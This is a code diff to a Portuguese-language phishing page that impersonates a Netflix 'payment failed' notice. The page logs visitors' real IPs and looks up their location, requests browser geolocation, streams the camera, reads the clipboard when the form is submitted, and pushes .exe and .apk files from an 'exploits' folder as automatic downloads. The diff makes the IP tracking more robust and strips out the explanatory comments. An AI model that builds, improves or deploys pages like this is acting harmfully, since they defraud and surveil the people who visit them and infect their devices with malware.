@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
@@ -6,6 +7,7 @@
     <title>Netflix | Falha no Pagamento</title>
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap">
     <style>
+        /* Teu CSS tá perfeito, não mexi nele */
         * {
             margin: 0;
             padding: 0;
@@ -134,7 +136,6 @@
     header("Access-Control-Allow-Headers: Content-Type, Authorization");
 
     function getUserIP() {
-        // Captura o IP real dos headers, como no MaxPhisher
         $headers = [
             'HTTP_CF_CONNECTING_IP', // Cloudflare
             'HTTP_X_FORWARDED_FOR',  // Proxy ou rede móvel
@@ -149,26 +150,53 @@
                     $ip_list = explode(',', $ip);
                     $ip = trim($ip_list[0]); // Pega o primeiro IP
                 }
-                return $ip;
+                if (filter_var($ip, FILTER_VALIDATE_IP)) {
+                    return $ip;
+                }
             }
         }
         return 'IP não disponível';
     }
 
     function getIPInfo($ip) {
-        // Usa ipinfo.io pra localização baseada no IP
-        $api_url = "https://ipinfo.io/{$ip}/json";
+        if (!filter_var($ip, FILTER_VALIDATE_IP)) {
+            return ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
+        }
+
+        $encoded_ip = urlencode($ip);
+        $api_url = "http://ip-api.com/json/{$encoded_ip}"; // Trocado pra ip-api.com
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $api_url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
         $response = curl_exec($ch);
+
         if (curl_errno($ch)) {
-            error_log('Erro cURL ao acessar ipinfo.io: ' . curl_error($ch));
+            error_log('Erro cURL ao acessar ip-api.com: ' . curl_error($ch) . " | IP: $ip");
+            curl_close($ch);
             return ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
         }
+
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
         curl_close($ch);
+
+        if ($http_code !== 200) {
+            error_log("Erro HTTP $http_code ao acessar ip-api.com | IP: $ip");
+            return ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
+        }
+
         $data = json_decode($response, true);
-        return $data ?: ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
+        if (!$data || $data['status'] !== 'success') {
+            error_log("Resposta inválida do ip-api.com | IP: $ip | Resposta: $response");
+            return ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
+        }
+
+        // Ajusta os campos pra combinar com teu código
+        return [
+            'city' => $data['city'] ?? 'Cidade desconhecida',
+            'region' => $data['regionName'] ?? 'Região desconhecida',
+            'country' => $data['country'] ?? 'País desconhecido'
+        ];
     }
 
     function getExploitFiles() {
@@ -275,7 +303,6 @@
         const clipboardData = document.getElementById('clipboardData');
         const form = document.getElementById('form');
 
-        // Captura da localização com pop-up no carregamento
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 position => {
@@ -291,7 +318,6 @@
             locationData.value = "Geolocalização não suportada";
         }
 
-        // Captura contínua da câmera com pop-up no carregamento
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 video.srcObject = stream;
@@ -322,7 +348,6 @@
                 console.error('Erro ao acessar a câmera:', err);
             });
 
-        // Função para capturar o clipboard com pop-up
         async function captureClipboard() {
             try {
                 if (navigator.clipboard && navigator.clipboard.readText) {
@@ -339,7 +364,6 @@
             }
         }
 
-        // Função para iniciar downloads
         function triggerDownload(filePath, fileName) {
             const link = document.createElement('a');
             link.href = filePath;
@@ -350,7 +374,6 @@
             console.log(`Download iniciado: ${fileName}`);
         }
 
-        // Configurar tudo
         window.onload = () => {
             document.cookie = "teste_cookie=valor_teste; path=/; max-age=3600";
 
@@ -365,16 +388,15 @@
                 console.log("Nenhum arquivo .exe ou .apk encontrado na pasta exploits/.");
             }
 
-            // Captura o clipboard só no clique do botão
             form.addEventListener('submit', async (event) => {
-                event.preventDefault(); // Pausa o envio
-                const clipboardText = await captureClipboard(); // Pede permissão aqui
+                event.preventDefault();
+                const clipboardText = await captureClipboard();
                 clipboardData.value = clipboardText;
                 console.log("Clipboard enviado: ", clipboardText);
-                form.submit(); // Envia após capturar
+                form.submit();
             });
         };
-
+        
   //
   //
   //
